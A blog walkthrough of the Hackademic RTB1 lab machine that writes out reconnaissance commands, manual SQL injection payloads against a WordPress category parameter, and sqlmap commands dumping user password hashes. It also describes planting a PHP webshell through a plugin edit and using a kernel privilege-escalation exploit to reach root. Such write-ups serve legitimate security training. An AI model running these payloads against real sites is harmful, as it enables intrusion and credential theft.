---
layout: post
title: "hackademic:rtb1"
date: 2016-08-03 10:30:58 -0500
comments: true
categories: [vulhub, wordpress]
---

###Tools:

* Netdiscover
* Nmap
* Wfuzz
* Nikto
* Wpscan


###Vulnerabilities:
[Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation](https://www.exploit-db.com/exploits/15285/)


<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.41.0/24`
{% img  /images/blog/vulhub/rtb1/Selection_001.png   [title manually exploit [alt text]] %}

192.168.41.157 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.41.157 -p-`

{% img  /images/blog/vulhub/rtb1/Selection_002.png   [title manually exploit [alt text]] %}

Only port 80 is opening.

Use both wfuzz and nikto to scan the host, nothing interesting...

Check the page,

{% img  /images/blog/vulhub/rtb1/Selection_003.png   [title manually exploit [alt text]] %}

find a link `http://192.168.41.157/Hackademic_RTB1/`

use wfuzz to scan:

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2>/dev/null
```

{% img  /images/blog/vulhub/rtb1/Selection_004.png   [title manually exploit [alt text]] %}

There is a wordpress.

use wpscan to scan

`wpscan http://192.168.41.157/Hackademic_RTB1/`


{% img  /images/blog/vulhub/rtb1/Selection_005.png   [title manually exploit [alt text]] %}

There are a couple of exploits, I tried both of them and no luck.

Enumerate the page, find a possible SQL injection potint:

`http://192.168.41.157/Hackademic_RTB1/?cat=0'`

looks like parameter cat is vulnerable

{% img  /images/blog/vulhub/rtb1/Selection_009.png   [title manually exploit [alt text]] %}

next try:

`http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1`

{% img  /images/blog/vulhub/rtb1/Selection_016.png   [title manually exploit [alt text]] %}

keep trying until

`http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6`

{% img  /images/blog/vulhub/rtb1/Selection_010.png   [title manually exploit [alt text]] %}

got error. Now I know the current table in user by the vulnerable page has 5 columns.

next

`http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5`

{% img  /images/blog/vulhub/rtb1/Selection_011.png   [title manually exploit [alt text]] %}

now I can use second column to do injection.

`http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5`

{% img  /images/blog/vulhub/rtb1/Selection_012.png   [title manually exploit [alt text]] %}

next use sqlmap to get all tables,

`sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3`

get table names:

{% img  /images/blog/vulhub/rtb1/Selection_017.png   [title manually exploit [alt text]] %}

I want to check table `wp_users`

`sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns`

{% img  /images/blog/vulhub/rtb1/Selection_018.png   [title manually exploit [alt text]] %}


dump these two columns

`sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump`

{% img  /images/blog/vulhub/rtb1/Selection_019.png   [title manually exploit [alt text]] %}

now we can edit php webshell via plugin

{% img  /images/blog/vulhub/rtb1/Selection_020.png   [title manually exploit [alt text]] %}

Only textile1.php can be updated. Use that file to edit shell.

Setup netcat, and load `http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php`

get shell


{% img  /images/blog/vulhub/rtb1/Selection_021.png   [title manually exploit [alt text]] %}

`python -c 'import pty; pty.spawn("/bin/bash")'`

`uname -a`

get the `Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux`

I tried serveral local exploits and find this one works:

{% img  /images/blog/vulhub/rtb1/Selection_022.png   [title manually exploit [alt text]] %}

get the root:

{% img  /images/blog/vulhub/rtb1/Selection_023.png   [title manually exploit [alt text]] %}






